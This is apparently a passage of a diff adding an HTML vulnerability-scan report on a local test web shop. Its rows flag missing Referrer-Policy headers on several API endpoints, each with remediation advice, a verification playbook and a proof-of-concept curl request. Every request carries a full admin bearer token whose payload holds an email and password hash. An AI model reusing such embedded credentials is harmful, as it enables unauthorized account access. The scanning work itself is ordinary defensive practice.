+  -H &#x27;Authorization: Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiJ9.eyJzdGF0dXMiOiJzdWNjZXNzIiwiZGF0YSI6eyJpZCI6MSwidXNlcm5hbWUiOiIiLCJlbWFpbCI6ImFkbWluQGp1aWNlLXNoLm9wIiwicGFzc3dvcmQiOiIwMTkyMDIzYTdiYmQ3MzI1MDUxNmYwNjlkZjE4YjUwMCIsInJvbGUiOiJhZG1pbiIsImRlbHV4ZVRva2VuIjoiIiwibGFzdExvZ2luSXAiOiIiLCJwcm9maWxlSW1hZ2UiOiJhc3NldHMvcHVibGljL2ltYWdlcy91cGxvYWRzL2RlZmF1bHRBZG1pbi5wbmciLCJ0b3RwU2VjcmV0IjoiIiwiaXNBY3RpdmUiOnRydWUsImNyZWF0ZWRBdCI6IjIwMjYtMDUtMjMgMDM6MjE6MTguNDUyICswMDowMCIsInVwZGF0ZWRBdCI6IjIwMjYtMDUtMjMgMDM6MjE6MTguNDUyICswMDowMCIsImRlbGV0ZWRBdCI6bnVsbH0sImlhdCI6MTc3OTU0MDc3MX0.UmP_0aIYFA7tjh5EOF5bMsb6r2704LKPz65d5DLK-rdbFyPXrX1uVywFde_e67G5tdo9_MII5oz0ZMg1NOaNvb5yu-tusXM0zKY6nYFz__i_FuXQ48J3x4mDRs9k0fB1N12EyEywnHAftGTH7ygiJChXQQlw7yNQd6WuEmJFXRQ&#x27; \
+  -H &#x27;Cookie: language=en&#x27;
+```</td></tr>
+<tr><td><span class="badge">Low</span></td><td>headers</td><td>Security Header Issue (Missing Referrer) — http://localhost:3000/rest/admin/application-configuration<br><small>high confidence</small></td><td>Missing Referrer-Policy header.<br><code>curl \
+  http://localhost:3000/rest/admin/application-configuration \
+  -H &#x27;Host: localhost:3000&#x27; \
+  -H &#x27;Accept: application/json, text/plain, */*&#x27; \
+  -H &#x27;Referer: http://localhost:3000/&#x27; \
+  -H &#x27;Priority: u=0&#x27; \
+  -H &#x27;Connection: keep-alive&#x27; \
+  -H &#x27;User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:150.0) Gecko/20100101 Firefox/150.0&#x27; \
+  -H &#x27;Sec-Fetch-Dest: empty&#x27; \
+  -H &#x27;Sec-Fetch-Mode: cors&#x27; \
+  -H &#x27;Sec-Fetch-Site: same-origin&#x27; \
+  -H &#x27;Accept-Encoding: gzip, deflate, br, zstd&#x27; \
+  -H &#x27;Accept-Language: en-US,en;q=0.9&#x27; \
+  -H &#x27;Authorization: Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiJ9.eyJzdGF0dXMiOiJzdWNjZXNzIiwiZGF0YSI6eyJpZCI6MSwidXNlcm5hbWUiOiIiLCJlbWFpbCI6ImFkbWluQGp1aWNlLXNoLm9wIiwicGFzc3dvcmQiOiIwMTkyMDIzYTdiYmQ3MzI1MDUxNmYwNjlkZjE4YjUwMCIsInJvbGUiOiJhZG1pbiIsImRlbHV4ZVRva2VuIjoiIiwibGFzdExvZ2luSXAiOiIiLCJwcm9maWxlSW1hZ2UiOiJhc3NldHMvcHVibGljL2ltYWdlcy91cGxvYWRzL2RlZmF1bHRBZG1pbi5wbmciLCJ0b3RwU2VjcmV0IjoiIiwiaXNBY3RpdmUiOnRydWUsImNyZWF0ZWRBdCI6IjIwMjYtMDUtMjMgMDM6MjE6MTguNDUyICswMDowMCIsInVwZGF0ZWRBdCI6IjIwMjYtMDUtMjMgMDM6MjE6MTguNDUyICswMDowMCIsImRlbGV0ZWRBdCI6bnVsbH0sImlhdCI6MTc3OTU0MDc3MX0.UmP_0aIYFA7tjh5EOF5bMsb6r2704LKPz65d5DLK-rdbFyPXrX1uVywFde_e67G5tdo9_MII5oz0ZMg1NOaNvb5yu-tusXM0zKY6nYFz__i_FuXQ48J3x4mDRs9k0fB1N12EyEywnHAftGTH7ygiJChXQQlw7yNQd6WuEmJFXRQ&#x27; \
+  -H &#x27;Cookie: language=en&#x27;</code></td><td class="remediation">Set modern browser security headers at the edge or application layer. Deploy a restrictive CSP, HSTS for HTTPS origins, X-Content-Type-Options: nosniff, clickjacking protection, Referrer-Policy, Permissions-Policy, and hardened cookie flags.</td><td class="playbook">## MANUAL VERIFICATION
+
+1. Send the baseline request.
+2. Inspect response headers and Set-Cookie values.
+3. Confirm the missing, unsafe, or misconfigured header is reproducible.
+4. Verify whether the endpoint is an API, HTML page, or static asset to set priority.
+
+## IF AMBIGUOUS
+
+- Check whether a CDN or reverse proxy adds headers in production only.
+- For CORS, confirm credentials are actually allowed by browsers.
+- For cookies, confirm flags on every Set-Cookie response, not only this endpoint.
+
+## CLEANUP
+
+No cleanup required.
+
+## POC CURL
+
+```bash
+curl \
+  http://localhost:3000/rest/admin/application-configuration \
+  -H &#x27;Host: localhost:3000&#x27; \
+  -H &#x27;Accept: application/json, text/plain, */*&#x27; \
+  -H &#x27;Referer: http://localhost:3000/&#x27; \
+  -H &#x27;Priority: u=0&#x27; \
+  -H &#x27;Connection: keep-alive&#x27; \
+  -H &#x27;User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:150.0) Gecko/20100101 Firefox/150.0&#x27; \
+  -H &#x27;Sec-Fetch-Dest: empty&#x27; \
+  -H &#x27;Sec-Fetch-Mode: cors&#x27; \
+  -H &#x27;Sec-Fetch-Site: same-origin&#x27; \
+  -H &#x27;Accept-Encoding: gzip, deflate, br, zstd&#x27; \
+  -H &#x27;Accept-Language: en-US,en;q=0.9&#x27; \
+  -H &#x27;Authorization: Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiJ9.eyJzdGF0dXMiOiJzdWNjZXNzIiwiZGF0YSI6eyJpZCI6MSwidXNlcm5hbWUiOiIiLCJlbWFpbCI6ImFkbWluQGp1aWNlLXNoLm9wIiwicGFzc3dvcmQiOiIwMTkyMDIzYTdiYmQ3MzI1MDUxNmYwNjlkZjE4YjUwMCIsInJvbGUiOiJhZG1pbiIsImRlbHV4ZVRva2VuIjoiIiwibGFzdExvZ2luSXAiOiIiLCJwcm9maWxlSW1hZ2UiOiJhc3NldHMvcHVibGljL2ltYWdlcy91cGxvYWRzL2RlZmF1bHRBZG1pbi5wbmciLCJ0b3RwU2VjcmV0IjoiIiwiaXNBY3RpdmUiOnRydWUsImNyZWF0ZWRBdCI6IjIwMjYtMDUtMjMgMDM6MjE6MTguNDUyICswMDowMCIsInVwZGF0ZWRBdCI6IjIwMjYtMDUtMjMgMDM6MjE6MTguNDUyICswMDowMCIsImRlbGV0ZWRBdCI6bnVsbH0sImlhdCI6MTc3OTU0MDc3MX0.UmP_0aIYFA7tjh5EOF5bMsb6r2704LKPz65d5DLK-rdbFyPXrX1uVywFde_e67G5tdo9_MII5oz0ZMg1NOaNvb5yu-tusXM0zKY6nYFz__i_FuXQ48J3x4mDRs9k0fB1N12EyEywnHAftGTH7ygiJChXQQlw7yNQd6WuEmJFXRQ&#x27; \
+  -H &#x27;Cookie: language=en&#x27;
+```</td></tr>
+<tr><td><span class="badge">Low</span></td><td>headers</td><td>Security Header Issue (Missing Referrer) — http://localhost:3000/rest/basket/{id}<br><small>high confidence</small></td><td>Missing Referrer-Policy header.<br><code>curl \
+  http://localhost:3000/rest/basket/1 \
+  -H &#x27;Host: localhost:3000&#x27; \
+  -H &#x27;Accept: application/json, text/plain, */*&#x27; \
+  -H &#x27;Referer: http://localhost:3000/&#x27; \
+  -H &#x27;Priority: u=0&#x27; \
+  -H &#x27;Connection: keep-alive&#x27; \
+  -H &#x27;User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:150.0) Gecko/20100101 Firefox/150.0&#x27; \
+  -H &#x27;Sec-Fetch-Dest: empty&#x27; \
+  -H &#x27;Sec-Fetch-Mode: cors&#x27; \
+  -H &#x27;Sec-Fetch-Site: same-origin&#x27; \
+  -H &#x27;Accept-Encoding: gzip, deflate, br, zstd&#x27; \
+  -H &#x27;Accept-Language: en-US,en;q=0.9&#x27; \
+  -H &#x27;Authorization: Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiJ9.eyJzdGF0dXMiOiJzdWNjZXNzIiwiZGF0YSI6eyJpZCI6MSwidXNlcm5hbWUiOiIiLCJlbWFpbCI6ImFkbWluQGp1aWNlLXNoLm9wIiwicGFzc3dvcmQiOiIwMTkyMDIzYTdiYmQ3MzI1MDUxNmYwNjlkZjE4YjUwMCIsInJvbGUiOiJhZG1pbiIsImRlbHV4ZVRva2VuIjoiIiwibGFzdExvZ2luSXAiOiIiLCJwcm9maWxlSW1hZ2UiOiJhc3NldHMvcHVibGljL2ltYWdlcy91cGxvYWRzL2RlZmF1bHRBZG1pbi5wbmciLCJ0b3RwU2VjcmV0IjoiIiwiaXNBY3RpdmUiOnRydWUsImNyZWF0ZWRBdCI6IjIwMjYtMDUtMjMgMDM6MjE6MTguNDUyICswMDowMCIsInVwZGF0ZWRBdCI6IjIwMjYtMDUtMjMgMDM6MjE6MTguNDUyICswMDowMCIsImRlbGV0ZWRBdCI6bnVsbH0sImlhdCI6MTc3OTU0MDc3MX0.UmP_0aIYFA7tjh5EOF5bMsb6r2704LKPz65d5DLK-rdbFyPXrX1uVywFde_e67G5tdo9_MII5oz0ZMg1NOaNvb5yu-tusXM0zKY6nYFz__i_FuXQ48J3x4mDRs9k0fB1N12EyEywnHAftGTH7ygiJChXQQlw7yNQd6WuEmJFXRQ&#x27; \
+  -H &#x27;Cookie: language=en&#x27;</code></td><td class="remediation">Set modern browser security headers at the edge or application layer. Deploy a restrictive CSP, HSTS for HTTPS origins, X-Content-Type-Options: nosniff, clickjacking protection, Referrer-Policy, Permissions-Policy, and hardened cookie flags.</td><td class="playbook">## MANUAL VERIFICATION
+
+1. Send the baseline request.
+2. Inspect response headers and Set-Cookie values.
+3. Confirm the missing, unsafe, or misconfigured header is reproducible.
+4. Verify whether the endpoint is an API, HTML page, or static asset to set priority.
+
+## IF AMBIGUOUS
+
+- Check whether a CDN or reverse proxy adds headers in production only.
+- For CORS, confirm credentials are actually allowed by browsers.
+- For cookies, confirm flags on every Set-Cookie response, not only this endpoint.
+
+## CLEANUP
+
+No cleanup required.
+
+## POC CURL
+
+```bash
+curl \
+  http://localhost:3000/rest/basket/1 \
+  -H &#x27;Host: localhost:3000&#x27; \
+  -H &#x27;Accept: application/json, text/plain, */*&#x27; \
+  -H &#x27;Referer: http://localhost:3000/&#x27; \
+  -H &#x27;Priority: u=0&#x27; \
+  -H &#x27;Connection: keep-alive&#x27; \
+  -H &#x27;User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:150.0) Gecko/20100101 Firefox/150.0&#x27; \
+  -H &#x27;Sec-Fetch-Dest: empty&#x27; \
+  -H &#x27;Sec-Fetch-Mode: cors&#x27; \
+  -H &#x27;Sec-Fetch-Site: same-origin&#x27; \
+  -H &#x27;Accept-Encoding: gzip, deflate, br, zstd&#x27; \
+  -H &#x27;Accept-Language: en-US,en;q=0.9&#x27; \
+  -H &#x27;Authorization: Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiJ9.eyJzdGF0dXMiOiJzdWNjZXNzIiwiZGF0YSI6eyJpZCI6MSwidXNlcm5hbWUiOiIiLCJlbWFpbCI6ImFkbWluQGp1aWNlLXNoLm9wIiwicGFzc3dvcmQiOiIwMTkyMDIzYTdiYmQ3MzI1MDUxNmYwNjlkZjE4YjUwMCIsInJvbGUiOiJhZG1pbiIsImRlbHV4ZVRva2VuIjoiIiwibGFzdExvZ2luSXAiOiIiLCJwcm9maWxlSW1hZ2UiOiJhc3NldHMvcHVibGljL2ltYWdlcy91cGxvYWRzL2RlZmF1bHRBZG1pbi5wbmciLCJ0b3RwU2VjcmV0IjoiIiwiaXNBY3RpdmUiOnRydWUsImNyZWF0ZWRBdCI6IjIwMjYtMDUtMjMgMDM6MjE6MTguNDUyICswMDowMCIsInVwZGF0ZWRBdCI6IjIwMjYtMDUtMjMgMDM6MjE6MTguNDUyICswMDowMCIsImRlbGV0ZWRBdCI6bnVsbH0sImlhdCI6MTc3OTU0MDc3MX0.UmP_0aIYFA7tjh5EOF5bMsb6r2704LKPz65d5DLK-rdbFyPXrX1uVywFde_e67G5tdo9_MII5oz0ZMg1NOaNvb5yu-tusXM0zKY6nYFz__i_FuXQ48J3x4mDRs9k0fB1N12EyEywnHAftGTH7ygiJChXQQlw7yNQd6WuEmJFXRQ&#x27; \
+  -H &#x27;Cookie: language=en&#x27;
+```</td></tr>
+<tr><td><span class="badge">Low</span></td><td>headers</td><td>Security Header Issue (Missing Referrer) — http://localhost:3000/rest/continue-code<br><small>high confidence</small></td><td>Missing Referrer-Policy header.<br><code>curl \
+  http://localhost:3000/rest/continue-code \
+  -H &#x27;Host: localhost:3000&#x27; \
+  -H &#x27;Accept: application/json, text/plain, */*&#x27; \
+  -H &#x27;Referer: http://localhost:3000/&#x27; \
+  -H &#x27;Connection: keep-alive&#x27; \
+  -H &#x27;User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:150.0) Gecko/20100101 Firefox/150.0&#x27; \
+  -H &#x27;Sec-Fetch-Dest: empty&#x27; \
+  -H &#x27;Sec-Fetch-Mode: cors&#x27; \
+  -H &#x27;Sec-Fetch-Site: same-origin&#x27; \
+  -H &#x27;Accept-Encoding: gzip, deflate, br, zstd&#x27; \
+  -H &#x27;Accept-Language: en-US,en;q=0.9&#x27; \
+  -H &#x27;Authorization: Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiJ9.eyJzdGF0dXMiOiJzdWNjZXNzIiwiZGF0YSI6eyJpZCI6MSwidXNlcm5hbWUiOiIiLCJlbWFpbCI6ImFkbWluQGp1aWNlLXNoLm9wIiwicGFzc3dvcmQiOiIwMTkyMDIzYTdiYmQ3MzI1MDUxNmYwNjlkZjE4YjUwMCIsInJvbGUiOiJhZG1pbiIsImRlbHV4ZVRva2VuIjoiIiwibGFzdExvZ2luSXAiOiIiLCJwcm9maWxlSW1hZ2UiOiJhc3NldHMvcHVibGljL2ltYWdlcy91cGxvYWRzL2RlZmF1bHRBZG1pbi5wbmciLCJ0b3RwU2VjcmV0IjoiIiwiaXNBY3RpdmUiOnRydWUsImNyZWF0ZWRBdCI6IjIwMjYtMDUtMjMgMDM6MjE6MTguNDUyICswMDowMCIsInVwZGF0ZWRBdCI6IjIwMjYtMDUtMjMgMDM6MjE6MTguNDUyICswMDowMCIsImRlbGV0ZWRBdCI6bnVsbH0sImlhdCI6MTc3OTU0MDc3MX0.UmP_0aIYFA7tjh5EOF5bMsb6r2704LKPz65d5DLK-rdbFyPXrX1uVywFde_e67G5tdo9_MII5oz0ZMg1NOaNvb5yu-tusXM0zKY6nYFz__i_FuXQ48J3x4mDRs9k0fB1N12EyEywnHAftGTH7ygiJChXQQlw7yNQd6WuEmJFXRQ&#x27; \
+  -H &#x27;Cookie: language=en&#x27;</code></td><td class="remediation">Set modern browser security headers at the edge or application layer. Deploy a restrictive CSP, HSTS for HTTPS origins, X-Content-Type-Options: nosniff, clickjacking protection, Referrer-Policy, Permissions-Policy, and hardened cookie flags.</td><td class="playbook">## MANUAL VERIFICATION
+
+1. Send the baseline request.
+2. Inspect response headers and Set-Cookie values.
+3. Confirm the missing, unsafe, or misconfigured header is reproducible.
+4. Verify whether the endpoint is an API, HTML page, or static asset to set priority.
+
+## IF AMBIGUOUS
+
+- Check whether a CDN or reverse proxy adds headers in production only.
+- For CORS, confirm credentials are actually allowed by browsers.
+- For cookies, confirm flags on every Set-Cookie response, not only this endpoint.
+
+## CLEANUP
+
+No cleanup required.
+
+## POC CURL
+
+```bash
+curl \
+  http://localhost:3000/rest/continue-code \
+  -H &#x27;Host: localhost:3000&#x27; \
+  -H &#x27;Accept: application/json, text/plain, */*&#x27; \
+  -H &#x27;Referer: http://localhost:3000/&#x27; \
+  -H &#x27;Connection: keep-alive&#x27; \
+  -H &#x27;User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:150.0) Gecko/20100101 Firefox/150.0&#x27; \
+  -H &#x27;Sec-Fetch-Dest: empty&#x27; \
+  -H &#x27;Sec-Fetch-Mode: cors&#x27; \
+  -H &#x27;Sec-Fetch-Site: same-origin&#x27; \
+  -H &#x27;Accept-Encoding: gzip, deflate, br, zstd&#x27; \
+  -H &#x27;Accept-Language: en-US,en;q=0.9&#x27; \
+  -H &#x27;Authorization: Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiJ9.eyJzdGF0dXMiOiJzdWNjZXNzIiwiZGF0YSI6eyJpZCI6MSwidXNlcm5hbWUiOiIiLCJlbWFpbCI6ImFkbWluQGp1aWNlLXNoLm9wIiwicGFzc3dvcmQiOiIwMTkyMDIzYTdiYmQ3MzI1MDUxNmYwNjlkZjE4YjUwMCIsInJvbGUiOiJhZG1pbiIsImRlbHV4ZVRva2VuIjoiIiwibGFzdExvZ2luSXAiOiIiLCJwcm9maWxlSW1hZ2UiOiJhc3NldHMvcHVibGljL2ltYWdlcy91cGxvYWRzL2RlZmF1bHRBZG1pbi5wbmciLCJ0b3RwU2VjcmV0IjoiIiwiaXNBY3RpdmUiOnRydWUsImNyZWF0ZWRBdCI6IjIwMjYtMDUtMjMgMDM6MjE6MTguNDUyICswMDowMCIsInVwZGF0ZWRBdCI6IjIwMjYtMDUtMjMgMDM6MjE6MTguNDUyICswMDowMCIsImRlbGV0ZWRBdCI6bnVsbH0sImlhdCI6MTc3OTU0MDc3MX0.UmP_0aIYFA7tjh5EOF5bMsb6r2704LKPz65d5DLK-rdbFyPXrX1uVywFde_e67G5tdo9_MII5oz0ZMg1NOaNvb5yu-tusXM0zKY6nYFz__i_FuXQ48J3x4mDRs9k0fB1N12EyEywnHAftGTH7ygiJChXQQlw7yNQd6WuEmJFXRQ&#x27; \
+  -H &#x27;Cookie: language=en&#x27;
+```</td></tr>
+<tr><td><span class="badge">Low</span></td><td>headers</td><td>Security Header Issue (Missing Referrer) — http://localhost:3000/rest/order-history<br><small>high confidence</small></td><td>Missing Referrer-Policy header.<br><code>curl \
+  http://localhost:3000/rest/order-history \
+  -H &#x27;Host: localhost:3000&#x27; \
+  -H &#x27;Accept: application/json, text/plain, */*&#x27; \
+  -H &#x27;Referer: http://localhost:3000/&#x27; \
+  -H &#x27;Priority: u=0&#x27; \
+  -H &#x27;Connection: keep-alive&#x27; \
+  -H &#x27;User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:150.0) Gecko/20100101 Firefox/150.0&#x27; \
+  -H &#x27;Sec-Fetch-Dest: empty&#x27; \
+  -H &#x27;Sec-Fetch-Mode: cors&#x27; \
+  -H &#x27;Sec-Fetch-Site: same-origin&#x27; \
+  -H &#x27;Accept-Encoding: gzip, deflate, br, zstd&#x27; \
+  -H &#x27;Accept-Language: en-US,en;q=0.9&#x27; \
+  -H &#x27;Authorization: Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiJ9.eyJzdGF0dXMiOiJzdWNjZXNzIiwiZGF0YSI6eyJpZCI6MSwidXNlcm5hbWUiOiIiLCJlbWFpbCI6ImFkbWluQGp1aWNlLXNoLm9wIiwicGFzc3dvcmQiOiIwMTkyMDIzYTdiYmQ3MzI1MDUxNmYwNjlkZjE4YjUwMCIsInJvbGUiOiJhZG1pbiIsImRlbHV4ZVRva2VuIjoiIiwibGFzdExvZ2luSXAiOiIiLCJwcm9maWxlSW1hZ2UiOiJhc3NldHMvcHVibGljL2ltYWdlcy91cGxvYWRzL2RlZmF1bHRBZG1pbi5wbmciLCJ0b3RwU2VjcmV0IjoiIiwiaXNBY3RpdmUiOnRydWUsImNyZWF0ZWRBdCI6IjIwMjYtMDUtMjMgMDM6MjE6MTguNDUyICswMDowMCIsInVwZGF0ZWRBdCI6IjIwMjYtMDUtMjMgMDM6MjE6MTguNDUyICswMDowMCIsImRlbGV0ZWRBdCI6bnVsbH0sImlhdCI6MTc3OTU0MDc3MX0.UmP_0aIYFA7tjh5EOF5bMsb6r2704LKPz65d5DLK-rdbFyPXrX1uVywFde_e67G5tdo9_MII5oz0ZMg1NOaNvb5yu-tusXM0zKY6nYFz__i_FuXQ48J3x4mDRs9k0fB1N12EyEywnHAftGTH7ygiJChXQQlw7yNQd6WuEmJFXRQ&#x27; \
+  -H &#x27;Cookie: language=en&#x27;</code></td><td class="remediation">Set modern browser security headers at the edge or application layer. Deploy a restrictive CSP, HSTS for HTTPS origins, X-Content-Type-Options: nosniff, clickjacking protection, Referrer-Policy, Permissions-Policy, and hardened cookie flags.</td><td class="playbook">## MANUAL VERIFICATION
+
+1. Send the baseline request.
+2. Inspect response headers and Set-Cookie values.
+3. Confirm the missing, unsafe, or misconfigured header is reproducible.
+4. Verify whether the endpoint is an API, HTML page, or static asset to set priority.
+
+## IF AMBIGUOUS
+
+- Check whether a CDN or reverse proxy adds headers in production only.
+- For CORS, confirm credentials are actually allowed by browsers.
+- For cookies, confirm flags on every Set-Cookie response, not only this endpoint.
+
+## CLEANUP
+
+No cleanup required.
+
+## POC CURL
+
+```bash
+curl \
+  http://localhost:3000/rest/order-history \
+  -H &#x27;Host: localhost:3000&#x27; \
+  -H &#x27;Accept: application/json, text/plain, */*&#x27; \
+  -H &#x27;Referer: http://localhost:3000/&#x27; \
+  -H &#x27;Priority: u=0&#x27; \
+  -H &#x27;Connection: keep-alive&#x27; \
+  -H &#x27;User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:150.0) Gecko/20100101 Firefox/150.0&#x27; \
+  -H &#x27;Sec-Fetch-Dest: empty&#x27; \
+  -H &#x27;Sec-Fetch-Mode: cors&#x27; \
+  -H &#x27;Sec-Fetch-Site: same-origin&#x27; \
+  -H &#x27;Accept-Encoding: gzip, deflate, br, zstd&#x27; \
+  -H &#x27;Accept-Language: en-US,en;q=0.9&#x27; \
+  -H &#x27;Authorization: Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiJ9.eyJzdGF0dXMiOiJzdWNjZXNzIiwiZGF0YSI6eyJpZCI6MSwidXNlcm5hbWUiOiIiLCJlbWFpbCI6ImFkbWluQGp1aWNlLXNoLm9wIiwicGFzc3dvcmQiOiIwMTkyMDIzYTdiYmQ3MzI1MDUxNmYwNjlkZjE4YjUwMCIsInJvbGUiOiJhZG1pbiIsImRlbHV4ZVRva2VuIjoiIiwibGFzdExvZ2luSXAiOiIiLCJwcm9maWxlSW1hZ2UiOiJhc3NldHMvcHVibGljL2ltYWdlcy91cGxvYWRzL2RlZmF1bHRBZG1pbi5wbmciLCJ0b3RwU2VjcmV0IjoiIiwiaXNBY3RpdmUiOnRydWUsImNyZWF0ZWRBdCI6IjIwMjYtMDUtMjMgMDM6MjE6MTguNDUyICswMDowMCIsInVwZGF0ZWRBdCI6IjIwMjYtMDUtMjMgMDM6MjE6MTguNDUyICswMDowMCIsImRlbGV0ZWRBdCI6bnVsbH0sImlhdCI6MTc3OTU0MDc3MX0.UmP_0aIYFA7tjh5EOF5bMsb6r2704LKPz65d5DLK-rdbFyPXrX1uVywFde_e67G5tdo9_MII5oz0ZMg1NOaNvb5yu-tusXM0zKY6nYFz__i_FuXQ48J3x4mDRs9k0fB1N12EyEywnHAftGTH7ygiJChXQQlw7yNQd6WuEmJFXRQ&#x27; \
+  -H &#x27;Cookie: language=en&#x27;
+```</td></tr>
+<tr><td><span class="badge">Low</span></td><td>headers</td><td>Security Header Issue (Missing Referrer) — http://localhost:3000/rest/products/search<br><small>high confidence</small></td><td>Missing Referrer-Policy header.<br><code>curl \
+  &#x27;http://localhost:3000/rest/products/search?q=&#x27; \
+  -H &#x27;Host: localhost:3000&#x27; \
+  -H &#x27;Accept: application/json, text/plain, */*&#x27; \
+  -H &#x27;Referer: http://localhost:3000/&#x27; \
+  -H &#x27;Priority: u=0&#x27; \
+  -H &#x27;Connection: keep-alive&#x27; \
+  -H &#x27;User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:150.0) Gecko/20100101 Firefox/150.0&#x27; \
+  -H &#x27;Sec-Fetch-Dest: empty&#x27; \
+  -H &#x27;Sec-Fetch-Mode: cors&#x27; \
+  -H &#x27;Sec-Fetch-Site: same-origin&#x27; \
+  -H &#x27;Accept-Encoding: gzip, deflate, br, zstd&#x27; \
+  -H &#x27;Accept-Language: en-US,en;q=0.9&#x27; \
+  -H &#x27;Authorization: Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiJ9.eyJzdGF0dXMiOiJzdWNjZXNzIiwiZGF0YSI6eyJpZCI6MSwidXNlcm5hbWUiOiIiLCJlbWFpbCI6ImFkbWluQGp1aWNlLXNoLm9wIiwicGFzc3dvcmQiOiIwMTkyMDIzYTdiYmQ3MzI1MDUxNmYwNjlkZjE4YjUwMCIsInJvbGUiOiJhZG1pbiIsImRlbHV4ZVRva2VuIjoiIiwibGFzdExvZ2luSXAiOiIiLCJwcm9maWxlSW1hZ2UiOiJhc3NldHMvcHVibGljL2ltYWdlcy91cGxvYWRzL2RlZmF1bHRBZG1pbi5wbmciLCJ0b3RwU2VjcmV0IjoiIiwiaXNBY3RpdmUiOnRydWUsImNyZWF0ZWRBdCI6IjIwMjYtMDUtMjMgMDM6MjE6MTguNDUyICswMDowMCIsInVwZGF0ZWRBdCI6IjIwMjYtMDUtMjMgMDM6MjE6MTguNDUyICswMDowMCIsImRlbGV0ZWRBdCI6bnVsbH0sImlhdCI6MTc3OTU0MDc3MX0.UmP_0aIYFA7tjh5EOF5bMsb6r2704LKPz65d5DLK-rdbFyPXrX1uVywFde_e67G5tdo9_MII5oz0ZMg1NOaNvb5yu-tusXM0zKY6nYFz__i_FuXQ48J3x4mDRs9k0fB1N12EyEywnHAftGTH7ygiJChXQQlw7yNQd6WuEmJFXRQ&#x27; \
+  -H &#x27;Cookie: language=en&#x27;</code></td><td class="remediation">Set modern browser security headers at the edge or application layer. Deploy a restrictive CSP, HSTS for HTTPS origins, X-Content-Type-Options: nosniff, clickjacking protection, Referrer-Policy, Permissions-Policy, and hardened cookie flags.</td><td class="playbook">## MANUAL VERIFICATION
+
+1. Send the baseline request.
+2. Inspect response headers and Set-Cookie values.
+3. Confirm the missing, unsafe, or misconfigured header is reproducible.
+4. Verify whether the endpoint is an API, HTML page, or static asset to set priority.
+
+## IF AMBIGUOUS
+
+- Check whether a CDN or reverse proxy adds headers in production only.
+- For CORS, confirm credentials are actually allowed by browsers.
+- For cookies, confirm flags on every Set-Cookie response, not only this endpoint.
+
+## CLEANUP
+
+No cleanup required.
+
+## POC CURL
+
+```bash
+curl \
+  &#x27;http://localhost:3000/rest/products/search?q=&#x27; \
+  -H &#x27;Host: localhost:3000&#x27; \
+  -H &#x27;Accept: application/json, text/plain, */*&#x27; \
+  -H &#x27;Referer: http://localhost:3000/&#x27; \
+  -H &#x27;Priority: u=0&#x27; \
+  -H &#x27;Connection: keep-alive&#x27; \
+  -H &#x27;User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:150.0) Gecko/20100101 Firefox/150.0&#x27; \
+  -H &#x27;Sec-Fetch-Dest: empty&#x27; \
+  -H &#x27;Sec-Fetch-Mode: cors&#x27; \
+  -H &#x27;Sec-Fetch-Site: same-origin&#x27; \
+  -H &#x27;Accept-Encoding: gzip, deflate, br, zstd&#x27; \
+  -H &#x27;Accept-Language: en-US,en;q=0.9&#x27; \
+  -H &#x27;Authorization: Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiJ9.eyJzdGF0dXMiOiJzdWNjZXNzIiwiZGF0YSI6eyJpZCI6MSwidXNlcm5hbWUiOiIiLCJlbWFpbCI6ImFkbWluQGp1aWNlLXNoLm9wIiwicGFzc3dvcmQiOiIwMTkyMDIzYTdiYmQ3MzI1MDUxNmYwNjlkZjE4YjUwMCIsInJvbGUiOiJhZG1pbiIsImRlbHV4ZVRva2VuIjoiIiwibGFzdExvZ2luSXAiOiIiLCJwcm9maWxlSW1hZ2UiOiJhc3NldHMvcHVibGljL2ltYWdlcy91cGxvYWRzL2RlZmF1bHRBZG1pbi5wbmciLCJ0b3RwU2VjcmV0IjoiIiwiaXNBY3RpdmUiOnRydWUsImNyZWF0ZWRBdCI6IjIwMjYtMDUtMjMgMDM6MjE6MTguNDUyICswMDowMCIsInVwZGF0ZWRBdCI6IjIwMjYtMDUtMjMgMDM6MjE6MTguNDUyICswMDowMCIsImRlbGV0ZWRBdCI6bnVsbH0sImlhdCI6MTc3OTU0MDc3MX0.UmP_0aIYFA7tjh5EOF5bMsb6r2704LKPz65d5DLK-rdbFyPXrX1uVywFde_e67G5tdo9_MII5oz0ZMg1NOaNvb5yu-tusXM0zKY6nYFz__i_FuXQ48J3x4mDRs9k0fB1N12EyEywnHAftGTH7ygiJChXQQlw7yNQd6WuEmJFXRQ&#x27; \
+  -H &#x27;Cookie: language=en&#x27;
+```</td></tr>
+<tr><td><span class="badge">Low</span></td><td>headers</td><td>Security Header Issue (Missing Referrer) — http://localhost:3000/rest/products/{id}/reviews<br><small>high confidence</small></td><td>Missing Referrer-Policy header.<br><code>curl \
+  http://localhost:3000/rest/products/1/reviews \
+  -H &#x27;Host: localhost:3000&#x27; \
+  -H &#x27;Accept: application/json, text/plain, */*&#x27; \
+  -H &#x27;Referer: http://localhost:3000/&#x27; \
+  -H &#x27;Priority: u=0&#x27; \
+  -H &#x27;Connection: keep-alive&#x27; \
+  -H &#x27;User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:150.0) Gecko/20100101 Firefox/150.0&#x27; \
+  -H &#x27;Sec-Fetch-Dest: empty&#x27; \
